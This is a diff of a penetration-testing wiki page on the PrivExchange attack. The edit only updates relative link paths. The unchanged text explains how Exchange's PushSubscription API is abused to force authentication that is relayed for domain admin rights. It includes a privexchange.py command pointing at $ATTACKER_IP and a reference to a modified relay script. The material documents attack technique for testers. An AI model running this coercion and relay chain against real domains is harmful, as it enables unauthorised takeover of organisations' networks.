@@ -2,7 +2,7 @@
 
 ## Theory
 
-"PushSubscription" is an API on Exchange Web Services that allows to subscribe to push notifications. Attackers abuse it to make Exchange servers authenticate to a target of their choosing. As Exchange servers usually have high privileges in a domain \(i.e. `WriteDacl`, see [Abusing ACLs](../access-control-entries/)\), the forced authentication can then be relayed and abused to obtain domain admin privileges \(see [NTLM Relay](../lm-and-ntlm/relay.md) and [Kerberos Unconstrained Delegations](../kerberos/delegations.md#unconstrained-delegations-kud)\).
+"PushSubscription" is an API on Exchange Web Services that allows to subscribe to push notifications. Attackers abuse it to make Exchange servers authenticate to a target of their choosing. As Exchange servers usually have high privileges in a domain \(i.e. `WriteDacl`, see [Abusing ACLs](../access-control-entries/)\), the forced authentication can then be relayed and abused to obtain domain admin privileges \(see [NTLM Relay](../ntlm/relay.md) and [Kerberos Unconstrained Delegations](../kerberos/delegations.md#unconstrained-delegations-kud)\).
 
 ## Practice
 
@@ -13,7 +13,7 @@ privexchange.py -d $DOMAIN -u '$DOMAIN_USER' -p '$PASSWORD' -ah $ATTACKER_IP $EX
 ```
 
 {% hint style="info" %}
-In the situation where the tester doesn't have any credentials, it is still possible to [relay an authentication](../lm-and-ntlm/relay.md) to make the API call.
+In the situation where the tester doesn't have any credentials, it is still possible to [relay an authentication](../ntlm/relay.md) to make the API call.
 
 The modified [httpattack.py](https://github.com/dirkjanm/PrivExchange/blob/master/httpattack.py) can be used with ntlmrelayx.py to perform this attack. The attacker host needs to be modified in the script since it is hard-coded.
 
